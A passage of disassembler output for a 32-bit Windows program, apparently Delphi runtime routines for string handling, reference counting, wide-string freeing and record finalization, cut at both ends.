		shr	ecx, 1

loc_403C1B:				; CODE XREF: CODE:00403C14j
		jmp	sub_403AF0
; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403C24	proc near		; CODE XREF: sub_404408+Bp
					; sub_405640+32p ...
		test	eax, eax
		jz	short locret_403C2B
		mov	eax, [eax-4]

locret_403C2B:				; CODE XREF: sub_403C24+2j
		retn
sub_403C24	endp


; =============== S U B	R O U T	I N E =======================================


sub_403C2C	proc near		; CODE XREF: sub_403C70+1Dj
					; sub_403C70+6Ej ...
		test	edx, edx
		jz	short locret_403C6F
		mov	ecx, [eax]
		test	ecx, ecx
		jz	sub_4039E8
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		mov	esi, edx
		mov	edi, [ecx-4]
		mov	edx, [esi-4]
		add	edx, edi
		cmp	esi, ecx
		jz	short loc_403C64
		call	sub_403F0C
		mov	eax, esi
		mov	ecx, [esi-4]

loc_403C57:				; CODE XREF: sub_403C2C+41j
		mov	edx, [ebx]
		add	edx, edi
		call	sub_402664
		pop	edi
		pop	esi
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_403C64:				; CODE XREF: sub_403C2C+1Fj
		call	sub_403F0C
		mov	eax, [ebx]
		mov	ecx, edi
		jmp	short loc_403C57
; ---------------------------------------------------------------------------

locret_403C6F:				; CODE XREF: sub_403C2C+2j
		retn
sub_403C2C	endp


; =============== S U B	R O U T	I N E =======================================


sub_403C70	proc near		; CODE XREF: sub_405CF8+89p
					; sub_40609C+5Cp ...
		test	edx, edx
		jz	short loc_403CD5
		test	ecx, ecx
		jz	sub_4039E8
		cmp	edx, [eax]
		jz	short loc_403CDC
		cmp	ecx, [eax]
		jz	short loc_403C92
		push	eax
		push	ecx
		call	sub_4039E8
		pop	edx
		pop	eax
		jmp	sub_403C2C
; ---------------------------------------------------------------------------

loc_403C92:				; CODE XREF: sub_403C70+12j
		push	ebx
		push	esi
		push	edi
		mov	ebx, edx
		mov	esi, ecx
		push	eax
		mov	eax, [ebx-4]
		add	eax, [esi-4]
		call	sub_403A58
		mov	edi, eax
		mov	edx, eax
		mov	eax, ebx
		mov	ecx, [ebx-4]
		call	sub_402664
		mov	edx, edi
		mov	eax, esi
		mov	ecx, [esi-4]
		add	edx, [ebx-4]
		call	sub_402664
		pop	eax
		mov	edx, edi
		test	edi, edi
		jz	short loc_403CCC
		dec	dword ptr [edi-8]

loc_403CCC:				; CODE XREF: sub_403C70+57j
		call	sub_4039E8
		pop	edi
		pop	esi
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_403CD5:				; CODE XREF: sub_403C70+2j
		mov	edx, ecx
		jmp	sub_4039E8
; ---------------------------------------------------------------------------

loc_403CDC:				; CODE XREF: sub_403C70+Ej
		mov	edx, ecx
		jmp	sub_403C2C
sub_403C70	endp

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_403CE4	proc near		; CODE XREF: sub_405CF8+7Bp
					; sub_406284+180p ...

var_14		= dword	ptr -14h

		push	ebx
		push	esi
		push	edi
		push	edx
		push	eax
		mov	ebx, edx
		xor	edi, edi
		mov	ecx, [esp+edx*4+14h]
		test	ecx, ecx
		jz	short loc_403D01
		cmp	[eax], ecx
		jnz	short loc_403D01
		mov	edi, ecx
		mov	eax, [ecx-4]
		dec	edx
		jmp	short loc_403D03
; ---------------------------------------------------------------------------

loc_403D01:				; CODE XREF: sub_403CE4+Fj
					; sub_403CE4+13j
		xor	eax, eax

loc_403D03:				; CODE XREF: sub_403CE4+1Bj
					; sub_403CE4+31j
		mov	ecx, [esp+edx*4+14h]
		test	ecx, ecx
		jz	short loc_403D14
		add	eax, [ecx-4]
		cmp	edi, ecx
		jnz	short loc_403D14
		xor	edi, edi

loc_403D14:				; CODE XREF: sub_403CE4+25j
					; sub_403CE4+2Cj
		dec	edx
		jnz	short loc_403D03
		test	edi, edi
		jz	short loc_403D32
		mov	edx, eax
		mov	eax, [esp+14h+var_14]
		mov	esi, [edi-4]
		call	sub_403F0C
		mov	edi, [esp+14h+var_14]
		push	dword ptr [edi]
		add	esi, [edi]
		dec	ebx
		jmp	short loc_403D3A
; ---------------------------------------------------------------------------

loc_403D32:				; CODE XREF: sub_403CE4+35j
		call	sub_403A58
		push	eax
		mov	esi, eax

loc_403D3A:				; CODE XREF: sub_403CE4+4Cj
					; sub_403CE4+6Bj
		mov	eax, [esp+ebx*4+18h]
		mov	edx, esi
		test	eax, eax
		jz	short loc_403D4E
		mov	ecx, [eax-4]
		add	esi, ecx
		call	sub_402664

loc_403D4E:				; CODE XREF: sub_403CE4+5Ej
		dec	ebx
		jnz	short loc_403D3A
		pop	edx
		pop	eax
		test	edi, edi
		jnz	short loc_403D63
		test	edx, edx
		jz	short loc_403D5E
		dec	dword ptr [edx-8]

loc_403D5E:				; CODE XREF: sub_403CE4+75j
		call	sub_4039E8

loc_403D63:				; CODE XREF: sub_403CE4+71j
		pop	edx
		pop	edi
		pop	esi
		pop	ebx
		pop	eax
		lea	esp, [esp+edx*4]
		jmp	eax
sub_403CE4	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_403D70	proc near		; CODE XREF: sub_406960+9Dp
					; sub_41557C+95p ...
		push	ebx
		push	esi
		push	edi
		mov	esi, eax
		mov	edi, edx
		cmp	eax, edx
		jz	loc_403E0E
		test	esi, esi
		jz	short loc_403DEB
		test	edi, edi
		jz	short loc_403DF2
		mov	eax, [esi-4]
		mov	edx, [edi-4]
		sub	eax, edx
		ja	short loc_403D93
		add	edx, eax

loc_403D93:				; CODE XREF: sub_403D70+1Fj
		push	edx
		shr	edx, 2
		jz	short loc_403DBF

loc_403D99:				; CODE XREF: sub_403D70+45j
		mov	ecx, [esi]
		mov	ebx, [edi]
		cmp	ecx, ebx
		jnz	short loc_403DF9
		dec	edx
		jz	short loc_403DB9
		mov	ecx, [esi+4]
		mov	ebx, [edi+4]
		cmp	ecx, ebx
		jnz	short loc_403DF9
		add	esi, 8
		add	edi, 8
		dec	edx
		jnz	short loc_403D99
		jmp	short loc_403DBF
; ---------------------------------------------------------------------------

loc_403DB9:				; CODE XREF: sub_403D70+32j
		add	esi, 4
		add	edi, 4

loc_403DBF:				; CODE XREF: sub_403D70+27j
					; sub_403D70+47j
		pop	edx
		and	edx, 3
		jz	short loc_403DE7
		mov	ecx, [esi]
		mov	ebx, [edi]
		cmp	cl, bl
		jnz	short loc_403E0E
		dec	edx
		jz	short loc_403DE7
		cmp	ch, bh
		jnz	short loc_403E0E
		dec	edx
		jz	short loc_403DE7
		and	ebx, 0FF0000h
		and	ecx, 0FF0000h
		cmp	ecx, ebx
		jnz	short loc_403E0E

loc_403DE7:				; CODE XREF: sub_403D70+53j
					; sub_403D70+5Ej ...
		add	eax, eax
		jmp	short loc_403E0E
; ---------------------------------------------------------------------------

loc_403DEB:				; CODE XREF: sub_403D70+11j
		mov	edx, [edi-4]
		sub	eax, edx
		jmp	short loc_403E0E
; ---------------------------------------------------------------------------

loc_403DF2:				; CODE XREF: sub_403D70+15j
		mov	eax, [esi-4]
		sub	eax, edx
		jmp	short loc_403E0E
; ---------------------------------------------------------------------------

loc_403DF9:				; CODE XREF: sub_403D70+2Fj
					; sub_403D70+3Cj
		pop	edx
		cmp	cl, bl
		jnz	short loc_403E0E
		cmp	ch, bh
		jnz	short loc_403E0E
		shr	ecx, 10h
		shr	ebx, 10h
		cmp	cl, bl
		jnz	short loc_403E0E
		cmp	ch, bh

loc_403E0E:				; CODE XREF: sub_403D70+9j
					; sub_403D70+5Bj ...
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_403D70	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403E14	proc near		; CODE XREF: sub_405640+14p
					; sub_405640+1Cp ...
		test	eax, eax
		jz	short locret_403E22
		mov	edx, [eax-8]
		inc	edx
		jle	short locret_403E22
		lock inc dword ptr [eax-8]

locret_403E22:				; CODE XREF: sub_403E14+2j
					; sub_403E14+8j
		retn
sub_403E14	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403E24	proc near		; CODE XREF: sub_404408+13p
					; sub_405640+61p ...
		test	eax, eax
		jz	short loc_403E2A
		retn
; ---------------------------------------------------------------------------
byte_403E29	db 0			; DATA XREF: sub_403E24:loc_403E2Ao
; ---------------------------------------------------------------------------

loc_403E2A:				; CODE XREF: sub_403E24+2j
		mov	eax, offset byte_403E29
		retn
sub_403E24	endp


; =============== S U B	R O U T	I N E =======================================


sub_403E30	proc near		; CODE XREF: sub_403E74j sub_403E7Cj
		mov	edx, [eax]
		test	edx, edx
		jz	short loc_403E6E
		mov	ecx, [edx-8]
		dec	ecx
		jz	short loc_403E6E
		push	ebx
		mov	ebx, eax
		mov	eax, [edx-4]
		call	sub_403A58
		mov	edx, eax
		mov	eax, [ebx]
		mov	[ebx], edx
		push	eax
		mov	ecx, [eax-4]
		call	sub_402664
		pop	eax
		mov	ecx, [eax-8]
		dec	ecx
		jl	short loc_403E6B
		lock dec dword ptr [eax-8]
		jnz	short loc_403E6B
		lea	eax, [eax-8]
		call	sub_402540

loc_403E6B:				; CODE XREF: sub_403E30+2Bj
					; sub_403E30+31j
		mov	edx, [ebx]
		pop	ebx

loc_403E6E:				; CODE XREF: sub_403E30+4j
					; sub_403E30+Aj
		mov	eax, edx
		retn
sub_403E30	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_403E74	proc near		; CODE XREF: sub_403EC4+9p
					; sub_405640+5Ap ...
		jmp	sub_403E30
sub_403E74	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_403E7C	proc near		; CODE XREF: sub_405640+213p
					; sub_405640+224p ...
		jmp	sub_403E30
sub_403E7C	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403E84	proc near		; CODE XREF: sub_4059A8+10p
					; sub_406CDC+9Fp ...

arg_0		= dword	ptr  4

		push	ebx
		test	eax, eax
		jz	short loc_403EB6
		mov	ebx, [eax-4]
		test	ebx, ebx
		jz	short loc_403EB6
		dec	edx
		jl	short loc_403EAE
		cmp	edx, ebx
		jge	short loc_403EB6

loc_403E97:				; CODE XREF: sub_403E84+2Cj
		sub	ebx, edx
		test	ecx, ecx
		jl	short loc_403EB6
		cmp	ecx, ebx
		jg	short loc_403EB2

loc_403EA1:				; CODE XREF: sub_403E84+30j
		add	edx, eax
		mov	eax, [esp+4+arg_0]
		call	sub_403A84
		jmp	short loc_403EBF
; ---------------------------------------------------------------------------

loc_403EAE:				; CODE XREF: sub_403E84+Dj
		xor	edx, edx
		jmp	short loc_403E97
; ---------------------------------------------------------------------------

loc_403EB2:				; CODE XREF: sub_403E84+1Bj
		mov	ecx, ebx
		jmp	short loc_403EA1
; ---------------------------------------------------------------------------

loc_403EB6:				; CODE XREF: sub_403E84+3j
					; sub_403E84+Aj ...
		mov	eax, [esp+4+arg_0]
		call	sub_403994

loc_403EBF:				; CODE XREF: sub_403E84+28j
		pop	ebx
		retn	4
sub_403E84	endp

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_403EC4	proc near		; CODE XREF: sub_405978+21p
					; sub_406284+127p ...
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		mov	esi, edx
		mov	edi, ecx
		call	sub_403E74
		mov	edx, [ebx]
		test	edx, edx
		jz	short loc_403F08
		mov	ecx, [edx-4]
		dec	esi
		jl	short loc_403F08
		cmp	esi, ecx
		jge	short loc_403F08
		test	edi, edi
		jle	short loc_403F08
		sub	ecx, esi
		cmp	edi, ecx
		jle	short loc_403EEE
		mov	edi, ecx

loc_403EEE:				; CODE XREF: sub_403EC4+26j
		sub	ecx, edi
		add	edx, esi
		lea	eax, [edi+edx]
		call	sub_402664
		mov	edx, [ebx]
		mov	eax, ebx
		mov	edx, [edx-4]
		sub	edx, edi
		call	sub_403F0C

loc_403F08:				; CODE XREF: sub_403EC4+12j
					; sub_403EC4+18j ...
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_403EC4	endp


; =============== S U B	R O U T	I N E =======================================


sub_403F0C	proc near		; CODE XREF: sub_403AF0+5Dp
					; sub_403AF0+7Cp ...
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		mov	esi, edx
		xor	edi, edi
		test	edx, edx
		jle	short loc_403F61
		mov	eax, [ebx]
		test	eax, eax
		jz	short loc_403F42
		cmp	dword ptr [eax-8], 1
		jnz	short loc_403F42
		sub	eax, 8
		add	edx, 9
		push	eax
		mov	eax, esp
		call	sub_402560
		pop	eax
		add	eax, 8
		mov	[ebx], eax
		mov	[eax-4], esi
		mov	byte ptr [esi+eax], 0
		jmp	short loc_403F6A
; ---------------------------------------------------------------------------

loc_403F42:				; CODE XREF: sub_403F0C+11j
					; sub_403F0C+17j
		mov	eax, edx
		call	sub_403A58
		mov	edi, eax
		mov	eax, [ebx]
		test	eax, eax
		jz	short loc_403F61
		mov	edx, edi
		mov	ecx, [eax-4]
		cmp	ecx, esi
		jl	short loc_403F5C
		mov	ecx, esi

loc_403F5C:				; CODE XREF: sub_403F0C+4Cj
		call	sub_402664

loc_403F61:				; CODE XREF: sub_403F0C+Bj
					; sub_403F0C+43j
		mov	eax, ebx
		call	sub_403994
		mov	[ebx], edi

loc_403F6A:				; CODE XREF: sub_403F0C+34j
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_403F0C	endp

; ---------------------------------------------------------------------------
		align 10h
; START	OF FUNCTION CHUNK FOR sub_403FB4

loc_403F70:				; CODE XREF: sub_403FB4+1Dj
		mov	al, 1
		jmp	sub_402608
; END OF FUNCTION CHUNK	FOR sub_403FB4
; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_403F78	proc near		; CODE XREF: sub_403FB4+2j
					; sub_403FB4+Dj ...
		mov	edx, [eax]
		test	edx, edx
		jz	short locret_403F8C
		mov	dword ptr [eax], 0
		push	eax
		push	edx		; bstrString
		call	SysFreeString
		pop	eax

locret_403F8C:				; CODE XREF: sub_403F78+4j
		retn
sub_403F78	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_403F90	proc near		; CODE XREF: sub_4040E8+70p
		push	ebx
		push	esi
		mov	ebx, eax
		mov	esi, edx

loc_403F96:				; CODE XREF: sub_403F90+1Cj
		mov	eax, [ebx]
		test	eax, eax
		jz	short loc_403FA8
		mov	dword ptr [ebx], 0
		push	eax		; bstrString
		call	SysFreeString

loc_403FA8:				; CODE XREF: sub_403F90+Aj
		add	ebx, 4
		dec	esi
		jnz	short loc_403F96
		pop	esi
		pop	ebx
		retn
sub_403F90	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_403FB4	proc near		; CODE XREF: sub_4041F8+81p
					; sub_404314+61p

; FUNCTION CHUNK AT 00403F70 SIZE 00000007 BYTES

		test	edx, edx
		jz	sub_403F78
		mov	ecx, [edx-4]
		shr	ecx, 1
		jz	sub_403F78
		push	ecx		; len
		push	edx		; psz
		push	eax		; pbstr
		call	SysReAllocStringLen
		test	eax, eax
		jz	loc_403F70
		retn
sub_403FB4	endp


; =============== S U B	R O U T	I N E =======================================


sub_403FD8	proc near		; CODE XREF: sub_404008+86p
					; sub_40AB44+1Ep ...
		xor	ecx, ecx
		push	ebx
		mov	cl, [edx+1]
		push	esi
		push	edi
		mov	ebx, eax
		lea	esi, [ecx+edx+0Ah]
		mov	edi, [ecx+edx+6]

loc_403FEA:				; CODE XREF: sub_403FD8+29j
		mov	edx, [esi]
		mov	eax, [esi+4]
		add	eax, ebx
		mov	edx, [edx]
		mov	ecx, 1
		call	sub_404008
		add	esi, 8
		dec	edi
		jg	short loc_403FEA
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_403FD8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_404008	proc near		; CODE XREF: sub_403FD8+20p
					; sub_404008+70p
		test	ecx, ecx
		jz	locret_40409A
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		mov	esi, edx
		mov	edi, ecx
		xor	edx, edx
		mov	al, [esi]
		mov	dl, [esi+1]
		xor	ecx, ecx
		cmp	al, 0Ah
		jz	short loc_404048
		cmp	al, 0Bh
		jz	short loc_404048
		cmp	al, 0Ch
		jz	short loc_404052
		cmp	al, 0Dh
		jz	short loc_404065
		cmp	al, 0Eh
		jz	short loc_404083
		cmp	al, 0Fh
		jz	short loc_404048
		cmp	al, 11h
		jz	short loc_404048
		mov	al, 2
		pop	edi
		pop	esi
		pop	ebx
		jmp	sub_402608
; ---------------------------------------------------------------------------

loc_404048:				; CODE XREF: sub_404008+1Cj
					; sub_404008+20j ...
		mov	[ebx], ecx
		add	ebx, 4
		dec	edi
		jg	short loc_404048
		jmp	short loc_404097
; ---------------------------------------------------------------------------

loc_404052:				; CODE XREF: sub_404008+24j
					; sub_404008+59j
		mov	[ebx], ecx
		mov	[ebx+4], ecx
		mov	[ebx+8], ecx
		mov	[ebx+0Ch], ecx
		add	ebx, 10h
		dec	edi
		jg	short loc_404052
		jmp	short loc_404097
; ---------------------------------------------------------------------------

loc_404065:				; CODE XREF: sub_404008+28j
		push	ebp
		mov	ebp, edx

loc_404068:				; CODE XREF: sub_404008+76j
		mov	edx, [esi+ebp+0Ah]
		mov	eax, ebx
		add	ebx, [esi+ebp+2]
		mov	ecx, [esi+ebp+6]
		mov	edx, [edx]
		call	sub_404008
		dec	edi
		jg	short loc_404068
		pop	ebp
		jmp	short loc_404097
; ---------------------------------------------------------------------------

loc_404083:				; CODE XREF: sub_404008+2Cj
		push	ebp
		mov	ebp, edx

loc_404086:				; CODE XREF: sub_404008+8Cj
		mov	eax, ebx
		add	ebx, [esi+ebp+2]
		mov	edx, esi
		call	sub_403FD8
		dec	edi
		jg	short loc_404086
		pop	ebp

loc_404097:				; CODE XREF: sub_404008+48j
					; sub_404008+5Bj ...
		pop	edi
		pop	esi
		pop	ebx

locret_40409A:				; CODE XREF: sub_404008+2j
		retn
sub_404008	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40409C	proc near		; CODE XREF: sub_402D7C+12p
					; sub_4040E8+AFp ...
		xor	ecx, ecx
		push	ebx
		mov	cl, [edx+1]
		push	esi
		push	edi
		mov	ebx, eax
		lea	esi, [ecx+edx+0Ah]
		mov	edi, [ecx+edx+6]

loc_4040AE:				; CODE XREF: sub_40409C+29j
		mov	edx, [esi]
		mov	eax, [esi+4]
		add	eax, ebx
		mov	edx, [edx]
		mov	ecx, 1
		call	sub_4040E8
		add	esi, 8
		dec	edi
		jg	short loc_4040AE
		mov	eax, ebx
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_40409C	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4040D0	proc near		; CODE XREF: sub_4040E8+7Cp
		cmp	ds:dword_41600C, 0
		jz	short loc_4040E0
		call	ds:dword_41600C
		retn
; ---------------------------------------------------------------------------

loc_4040E0:				; CODE XREF: sub_4040D0+7j
		mov	al, 10h
		call	sub_402608
sub_4040D0	endp

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_4040E8	proc near		; CODE XREF: sub_40409C+20p
					; sub_4040E8+99p ...
		cmp	ecx, 0
		jz	locret_4041D1
		push	eax
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		mov	esi, edx
		mov	edi, ecx
		xor	edx, edx
		mov	al, [esi]
		mov	dl, [esi+1]
		cmp	al, 0Ah
		jz	short loc_40412B
		cmp	al, 0Bh
		jz	short loc_404148
		cmp	al, 0Ch
		jz	short loc_40415F
		cmp	al, 0Dh
		jz	short loc_40416E
		cmp	al, 0Eh
		jz	short loc_40418C
		cmp	al, 0Fh
		jz	loc_4041A2
		cmp	al, 11h
		jz	loc_4041B1
		jmp	loc_4041C2
; ---------------------------------------------------------------------------

loc_40412B:				; CODE XREF: sub_4040E8+1Cj
		cmp	ecx, 1
		mov	eax, ebx
		jg	short loc_40413C
		call	sub_403994
		jmp	loc_4041CD
; ---------------------------------------------------------------------------

loc_40413C:				; CODE XREF: sub_4040E8+48j
		mov	edx, ecx
		call	sub_4039B8
		jmp	loc_4041CD
; ---------------------------------------------------------------------------

loc_404148:				; CODE XREF: sub_4040E8+20j
		cmp	ecx, 1
		mov	eax, ebx
		jg	short loc_404156
		call	sub_403F78
		jmp	short loc_4041CD
; ---------------------------------------------------------------------------

loc_404156:				; CODE XREF: sub_4040E8+65j
		mov	edx, ecx
		call	sub_403F90
		jmp	short loc_4041CD
; ---------------------------------------------------------------------------

loc_40415F:				; CODE XREF: sub_4040E8+24j
					; sub_4040E8+82j
		mov	eax, ebx
		add	ebx, 10h
		call	sub_4040D0
		dec	edi
		jg	short loc_40415F
		jmp	short loc_4041CD
; ---------------------------------------------------------------------------

loc_40416E:				; CODE XREF: sub_4040E8+28j
		push	ebp
		mov	ebp, edx

loc_404171:				; CODE XREF: sub_4040E8+9Fj
		mov	edx, [esi+ebp+0Ah]
		mov	eax, ebx
		add	ebx, [esi+ebp+2]
		mov	ecx, [esi+ebp+6]
		mov	edx, [edx]
		call	sub_4040E8
		dec	edi
		jg	short loc_404171
		pop	ebp
		jmp	short loc_4041CD
; ---------------------------------------------------------------------------

loc_40418C:				; CODE XREF: sub_4040E8+2Cj
		push	ebp
		mov	ebp, edx

loc_40418F:				; CODE XREF: sub_4040E8+B5j
		mov	eax, ebx
		add	ebx, [esi+ebp+2]
		mov	edx, esi
		call	sub_40409C
		dec	edi
		jg	short loc_40418F
		pop	ebp
		jmp	short loc_4041CD
; ---------------------------------------------------------------------------

loc_4041A2:				; CODE XREF: sub_4040E8+30j
					; sub_4040E8+C5j
		mov	eax, ebx
		add	ebx, 4
		call	sub_404D10
		dec	edi
		jg	short loc_4041A2
		jmp	short loc_4041CD
; ---------------------------------------------------------------------------

loc_4041B1:				; CODE XREF: sub_4040E8+38j
					; sub_4040E8+D6j
		mov	eax, ebx
		mov	edx, esi
		add	ebx, 4
		call	sub_404724
		dec	edi
		jg	short loc_4041B1
		jmp	short loc_4041CD
; ---------------------------------------------------------------------------

loc_4041C2:				; CODE XREF: sub_4040E8+3Ej
		pop	edi
		pop	esi
		pop	ebx
		pop	eax
		mov	al, 2
		jmp	sub_402608
; ---------------------------------------------------------------------------

loc_4041CD:				; CODE XREF: sub_4040E8+4Fj
					; sub_4040E8+5Bj ...
		pop	edi
		pop	esi
		pop	ebx
		pop	eax

locret_4041D1:				; CODE XREF: sub_4040E8+3j
		retn
sub_4040E8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4041D4	proc near		; CODE XREF: sub_4092B0+34p
		mov	ecx, 1
		jmp	sub_4040E8
sub_4041D4	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4041E0	proc near		; CODE XREF: sub_4041F8+92p
					; sub_404314+75p
		cmp	ds:dword_416010, 0
		jz	short loc_4041F0
		call	ds:dword_416010
		retn
; ---------------------------------------------------------------------------

loc_4041F0:				; CODE XREF: sub_4041E0+7j
		mov	al, 10h
		call	sub_402608
sub_4041E0	endp

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_4041F8	proc near		; CODE XREF: sub_4041F8+CFp
					; sub_404314+ACp ...
		push	ebx
		push	esi
		push	edi
		push	ebp
		mov	ebx, eax
		mov	esi, edx
		xor	eax, eax
		mov	al, [ecx+1]
		lea	edi, [eax+ecx+0Ah]
		mov	ebp, [edi-4]
		xor	eax, eax
		mov	ecx, [edi-8]
		push	ecx

loc_404212:				; CODE XREF: sub_4041F8+100j
		mov	ecx, [edi+4]
		sub	ecx, eax
		jle	short loc_404224
		mov	edx, eax
		add	eax, esi
		add	edx, ebx
		call	sub_402664

loc_404224:				; CODE XREF: sub_4041F8+1Fj
		mov	eax, [edi+4]
		mov	edx, [edi]
		mov	edx, [edx]
		mov	cl, [edx]
		cmp	cl, 0Ah
		jz	short loc_404263
		cmp	cl, 0Bh
		jz	short loc_404274
		cmp	cl, 0Ch
		jz	short loc_404285
		cmp	cl, 0Dh
		jz	short loc_404296
		cmp	cl, 0Eh
		jz	short loc_4042B6
		cmp	cl, 0Fh
		jz	loc_4042CF
		cmp	cl, 11h
		jz	loc_4042E0
		mov	al, 2
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		jmp	sub_402608
; ---------------------------------------------------------------------------

loc_404263:				; CODE XREF: sub_4041F8+38j
		mov	edx, [eax+esi]
		add	eax, ebx
		call	sub_4039E8
		mov	eax, 4
		jmp	short loc_4042F1
; ---------------------------------------------------------------------------

loc_404274:				; CODE XREF: sub_4041F8+3Dj
		mov	edx, [eax+esi]
		add	eax, ebx
		call	sub_403FB4
		mov	eax, 4
		jmp	short loc_4042F1
; ---------------------------------------------------------------------------

loc_404285:				; CODE XREF: sub_4041F8+42j
		lea	edx, [eax+esi]
		add	eax, ebx
		call	sub_4041E0
		mov	eax, 10h
		jmp	short loc_4042F1
; ---------------------------------------------------------------------------

loc_404296:				; CODE XREF: sub_4041F8+47j
		xor	ecx, ecx
		mov	cl, [edx+1]
		push	dword ptr [ecx+edx+2]
		push	dword ptr [ecx+edx+6]
		mov	ecx, [ecx+edx+0Ah]
		mov	ecx, [ecx]
		lea	edx, [eax+esi]
		add	eax, ebx
		call	sub_404314
		pop	eax
		jmp	short loc_4042F1
; ---------------------------------------------------------------------------

loc_4042B6:				; CODE XREF: sub_4041F8+4Cj
		xor	ecx, ecx
		mov	cl, [edx+1]
		mov	ecx, [ecx+edx+2]
		push	ecx
		mov	ecx, edx
		lea	edx, [eax+esi]
		add	eax, ebx
		call	sub_4041F8
		pop	eax
		jmp	short loc_4042F1
; ---------------------------------------------------------------------------

loc_4042CF:				; CODE XREF: sub_4041F8+51j
		mov	edx, [eax+esi]
		add	eax, ebx
		call	sub_404D28
		mov	eax, 4
		jmp	short loc_4042F1
; ---------------------------------------------------------------------------

loc_4042E0:				; CODE XREF: sub_4041F8+5Aj
		mov	ecx, edx
		mov	edx, [eax+esi]
		add	eax, ebx
		call	sub_404760
		mov	eax, 4

loc_4042F1:				; CODE XREF: sub_4041F8+7Aj
					; sub_4041F8+8Bj ...
		add	eax, [edi+4]
		add	edi, 8
		dec	ebp
		jnz	loc_404212
		pop	ecx
		sub	ecx, eax
		jle	short loc_40430D
		lea	edx, [eax+ebx]
		add	eax, esi
		call	sub_402664

loc_40430D:				; CODE XREF: sub_4041F8+109j
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4041F8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_404314	proc near		; CODE XREF: sub_4041F8+B6p
					; sub_404314+98p ...

arg_0		= dword	ptr  4

		push	ebx
		push	esi
		push	edi
		push	ebp
		mov	ebx, eax
		mov	esi, edx
		mov	edi, ecx
		mov	ebp, [esp+10h+arg_0]
		mov	cl, [edi]
		cmp	cl, 0Ah
		jz	short loc_40435A
		cmp	cl, 0Bh
		jz	short loc_404371
		cmp	cl, 0Ch
		jz	short loc_404385
		cmp	cl, 0Dh
		jz	short loc_404399
		cmp	cl, 0Eh
		jz	short loc_4043BA
		cmp	cl, 0Fh
		jz	loc_4043D7
		cmp	cl, 11h
		jz	loc_4043EB
		mov	al, 2
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		jmp	sub_402608
; ---------------------------------------------------------------------------

loc_40435A:				; CODE XREF: sub_404314+13j
					; sub_404314+56j
		mov	eax, ebx
		mov	edx, [esi]
		call	sub_4039E8
		add	ebx, 4
		add	esi, 4
		dec	ebp
		jnz	short loc_40435A
		jmp	loc_4043FF
; ---------------------------------------------------------------------------

loc_404371:				; CODE XREF: sub_404314+18j
					; sub_404314+6Dj
		mov	eax, ebx
		mov	edx, [esi]
		call	sub_403FB4
		add	ebx, 4
		add	esi, 4
		dec	ebp
		jnz	short loc_404371
		jmp	short loc_4043FF
; ---------------------------------------------------------------------------

loc_404385:				; CODE XREF: sub_404314+1Dj
					; sub_404314+81j
		mov	eax, ebx
		mov	edx, esi
		call	sub_4041E0
		add	ebx, 10h
		add	esi, 10h
		dec	ebp
		jnz	short loc_404385
		jmp	short loc_4043FF
; ---------------------------------------------------------------------------

loc_404399:				; CODE XREF: sub_404314+22j
		xor	ecx, ecx
		mov	cl, [edi+1]
		lea	edi, [ecx+edi+2]

loc_4043A2:				; CODE XREF: sub_404314+A2j
		mov	eax, ebx
		mov	edx, esi
		mov	ecx, [edi+8]
		push	dword ptr [edi+4]
		call	sub_404314
		add	ebx, [edi]
		add	esi, [edi]
		dec	ebp
		jnz	short loc_4043A2
		jmp	short loc_4043FF
; ---------------------------------------------------------------------------

loc_4043BA:				; CODE XREF: sub_404314+27j
					; sub_404314+BFj
		mov	eax, ebx
		mov	edx, esi
		mov	ecx, edi
		call	sub_4041F8
		xor	eax, eax
		mov	al, [edi+1]
		add	ebx, [eax+edi+2]
		add	esi, [eax+edi+2]
		dec	ebp
		jnz	short loc_4043BA
		jmp	short loc_4043FF
; ---------------------------------------------------------------------------

loc_4043D7:				; CODE XREF: sub_404314+2Cj
					; sub_404314+D3j
